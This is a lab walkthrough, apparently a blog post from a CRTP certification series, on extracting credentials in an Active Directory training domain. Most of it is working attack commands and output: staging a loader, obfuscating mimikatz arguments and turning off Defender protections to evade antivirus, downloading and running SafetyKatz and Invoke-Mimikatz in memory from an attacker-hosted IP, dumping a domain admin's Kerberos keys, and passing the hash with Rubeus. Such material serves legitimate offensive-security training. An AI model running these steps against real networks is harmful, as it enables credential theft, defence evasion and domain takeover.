---
title: Active Directory (AD) | Local Privilege Escalation (Part 2)
author: beardenx
date: 2024-07-01 00:00:00 +0800
categories: [Cert, CRTP]
tags: [cert,active directory]     ## TAG names should always be lowercase
render_with_liquid: false
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---

## Step 4: Extract Credential

**Tools Used:** SafetyKatz.exe

### **Abuse using winrs**
To extract credentials from dcorp-mgmt, we will use SafetyKatz.exe. We need to avoid direct detection, so we'll transfer Loader.exe from dcorp-ci to dcorp-mgmt.

- Ensure WinRM Port is Open 

First, check if you can execute commands on dcorp-mgmt and confirm if the WinRM port is open:

```bash
winrs -r:dcorp-mgmt hostname;whoami
```
![Result](/img/crtp/result7.png){: width="972" height="589" }

- Download Loader.exe

Download Loader.exe to dcorp-ci:

```bash
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

- Copy Loader.exe to dcorp-mgmt

Copy Loader.exe from dcorp-ci to dcorp-mgmt:

```bash
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

- Set Up Port Forwarding

Establish port forwarding on dcorp-mgmt to evade detection. Use $null for output redirection to prevent command execution issues:

```bash
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

- Generate Encoded Arguments

To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader. Run the below command on the student VM to generate encoded arguments for sekurlsa::ekeys (this step does not need to be run on the reverse shell):

```bash
ArgSplit.bat
```

![Result](/img/crtp/result8.png){: width="972" height="589" }

- Create Batch File

Create a batch file with the encoded arguments. Below are the contents of the batch file(Safety.bat):
```bash
@echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn%
exit
```

Download the batch file on dcorp-ci:
```bash
iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
```

- Copy Safety.bat to dcorp-mgmt

Copy the batch file from dcorp-ci to dcorp-mgmt:

```bash
echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```

- Execute Safety.bat

Run the batch file on dcorp-mgmt that uses Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:

```bash
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
```

If successful, you should see output similar to:

```bash
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 3/3/2023 2:39:12 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
* Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
```

Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets!

### **Abuse using PowerShell Remoting**

- Check PowerShell Remoting

First, verify if you can execute commands on the dcorp-mgmt server using PowerShell remoting:

```bash
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
```
![Result](/img/crtp/result9.png){: width="972" height="589" }

This command returns the current username (ciadmin) and the computer name (dcorp-mgmt), confirming that PowerShell remoting is functional.

- Dump Hashes using Invoke-Mimikatz

To extract hashes, especially those of the domain admin (svcadmin), use Invoke-Mimikatz. First, host Invoke-Mimikatz.ps1 on your local machine (studentx) and execute it on the remote machine (dcorp-mgmt):

```bash
iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

- Disable AMSI on dcorp-mgmt

To use Invoke-Mimikatz on dcorp-mgmt, you need to disable AMSI (Antimalware Scan Interface) since it may detect and block such activities. Here's how you can disable it:

```bash
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-Command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

- Execute Invoke-Mimikatz

After disabling AMSI, execute Invoke-Mimikatz on dcorp-mgmt to dump hashes:
```bash
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

This command retrieves sensitive information such as authentication details. For instance, it might show:

```bash
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 3/3/2023 2:39:12 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
 * Key List :
  aes256_hmac 
  6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
  rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
  rc4_hmac_old b38ff50264b74508085d82c69794a4d8
  rc4_md4 b38ff50264b74508085d82c69794a4d8
  rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
  rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
```

## Step 5: OverPass-the-Hash with Rubeus

Finally, use OverPass-the-Hash to leverage svcadmin's credentials. Execute the following command on the student VM:

- Prepare Arguments for Loader

Generate encoded arguments for Rubeus using ArgSplit.bat:

```bash
C:\Windows\system32>C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: asktgt
set "z=t"
set "y=g"
set "x=t"
set "w=k"
set "v=s"
set "u=a"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```
These commands set up a variable Pwn with encoded arguments for Rubeus.

- Execute Loader with Rubeus

Run Loader.exe with Rubeus.exe, passing encoded arguments to request a TGT using svcadmin's credentials:

```bash
C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

`/user:svcadmin`: Specifies the user account for which the TGT should be requested.
`/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011`: The AES256 encryption key used to encrypt the ticket.
`/opsec`: Operates in OPSEC (Operations Security) mode to minimize detection.
`/createnetonly:C:\Windows\System32\cmd.exe`: Creates a new process with network credentials only.
`/show`: Displays detailed output during execution.
`/ptt`: Passes the ticket to the current session.

- Execution and Output

Upon successful execution, Rubeus requests a TGT and imports it into the current session. Example output includes:

```bash
`ServiceName`: The Kerberos service name for which the TGT was requested (krbtgt/dollarcorp.moneycorp.local).
`ServiceRealm`: The realm associated with the Kerberos service (DOLLARCORP.MONEYCORP.LOCAL).
`UserName`: The user for whom the TGT was requested (svcadmin).
```

After obtaining the TGT, access domain resources using tools like winrs:

```bash
C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username
USERNAME=svcadmin
```
This confirms successful use of svcadmin's credentials without direct access to dcorp-mgmt from the student's machine (172.16.100.X).
